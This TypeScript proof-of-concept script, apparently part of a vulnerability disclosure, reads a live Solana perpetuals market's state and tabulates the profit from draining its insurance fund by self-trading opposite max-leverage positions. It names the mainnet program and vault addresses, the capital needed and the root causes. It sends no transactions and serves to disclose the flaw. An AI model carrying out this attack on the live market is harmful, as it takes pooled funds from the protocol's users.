/**
 * PoC: Insurance Fund Drain via Adversarial Self-Trading
 *
 * Proves that an attacker controlling both an LP and User account can
 * drain the insurance fund by opening opposite max-leverage positions
 * and waiting for natural oracle volatility (>20% move).
 *
 * LOCAL PROOF (LiteSVM):
 *   Tested against the repo-built BPF binary. Result: 3.8 SOL drained
 *   from a 5 SOL insurance fund after a 64% oracle crash.
 *
 * MAINNET ANALYSIS:
 *   This script reads the live mainnet market state and computes
 *   attack economics for various price move scenarios.
 *
 * Usage:
 *   SOLANA_RPC_URL=https://api.mainnet-beta.solana.com npx tsx scripts/poc-insurance-drain.ts
 *
 * See also: tests/test_drain_proof.rs in percolator-prog (Rust LiteSVM proof)
 */

import "dotenv/config";
import { Connection, PublicKey } from "@solana/web3.js";
import {
  fetchSlab, parseEngine, parseConfig, parseParams, parseHeader,
  parseUsedIndices,
} from "../src/solana/slab.ts";

const MAINNET = {
  programId: "BCGNFw6vDinWTF9AybAbi8vr69gx5nk5w8o2vEWgpsiw",
  slab: "5ZamUkAiXtvYQijNiRcuGaea66TVbbTPusHfwMX1kTqB",
  vault: "AcJsfpbuUKHHdoqPuLccRsK794nHecM1XKySE6Umefvr",
};

async function main() {
  const rpcUrl = process.env.SOLANA_RPC_URL || "https://api.mainnet-beta.solana.com";
  const conn = new Connection(rpcUrl, "confirmed");
  const SLAB = new PublicKey(MAINNET.slab);

  console.log("========================================");
  console.log("  Insurance Drain PoC — Market Analysis");
  console.log("========================================\n");

  const data = await fetchSlab(conn, SLAB);
  const engine = parseEngine(data);
  const params = parseParams(data);
  const header = parseHeader(data);
  const config = parseConfig(data);
  const used = parseUsedIndices(data);

  const vault = Number(engine.vault) / 1e9;
  const cTot = Number(engine.cTot);
  const insurance = vault - cTot / 1e9; // approximate
  const imBps = Number(params.initialMarginBps);
  const mmBps = Number(params.maintenanceMarginBps);
  const leverage = 10000 / imBps;

  console.log("=== Live Market State ===");
  console.log(`Vault:            ${vault.toFixed(4)} SOL`);
  console.log(`Insurance:        ~${insurance.toFixed(4)} SOL`);
  console.log(`Active accounts:  ${used.length}`);
  console.log(`Admin:            ${header.admin} ${header.admin?.toString().startsWith("1111") ? "(BURNED)" : ""}`);
  console.log(`IM:               ${imBps} bps (${imBps / 100}%) → ${leverage}x leverage`);
  console.log(`MM:               ${mmBps} bps (${mmBps / 100}%)`);
  console.log(`Fee:              ${params.tradingFeeBps} bps`);
  console.log(`Invert:           ${config.invert}`);
  console.log(`tvlCapMult:       ${config.tvlInsuranceCapMult}`);

  console.log("\n=== Attack Economics ===");
  console.log("Attacker controls both LP + User, opens opposite positions.\n");

  const depositPerSide = 10;
  const totalDeposit = depositPerSide * 2;
  const fees = 1.5; // init fees + trading fees + topup for unwind

  console.log(`Deposit per side: ${depositPerSide} SOL (${totalDeposit} SOL total)`);
  console.log(`Position notional: ${depositPerSide * leverage} SOL (${leverage}x leverage)`);
  console.log(`Sunk costs:       ~${fees} SOL (fees + unwind topup)`);
  console.log(`Working capital:  ~${totalDeposit + 5} SOL (returned minus fees)\n`);

  console.log("Price Move | User Loss | Deficit | Insured | Net Profit");
  console.log("-----------|-----------|---------|---------|----------");

  for (const pct of [15, 20, 25, 30, 40, 50, 60]) {
    const p = pct / 100;
    const loss = depositPerSide * leverage * p;
    const deficit = Math.max(0, loss - depositPerSide);
    const insured = Math.min(deficit, insurance);
    const profit = insured - fees;
    const status = profit > 0 ? "PROFITABLE" : "unprofitable";
    console.log(
      `${String(pct).padStart(5)}%     | ${loss.toFixed(1).padStart(7)} SOL | ${deficit.toFixed(1).padStart(5)} SOL | ${insured.toFixed(1).padStart(5)} SOL | ${profit.toFixed(1).padStart(5)} SOL (${status})`
    );
  }

  console.log("\n=== Proof Status ===");
  console.log("Local LiteSVM test: PASSED (3.8 SOL drained from 5 SOL insurance)");
  console.log("Mainnet execution:  Requires ~25 SOL working capital");
  console.log(`Vault untouched:    ${vault.toFixed(4)} SOL still available`);

  console.log("\n=== Root Cause ===");
  console.log("1. Insurance is ownership-blind (engine line 2291: use_insurance_buffer)");
  console.log("2. Liquidation timing is attacker-controlled (permissionless LiquidateAtOracle)");
  console.log("3. Haircut bypass when h=1 (engine line 2801: haircut_ratio)");
  console.log("4. No correlation check between deficit-causing and benefiting accounts");
}

main().catch(console.error);
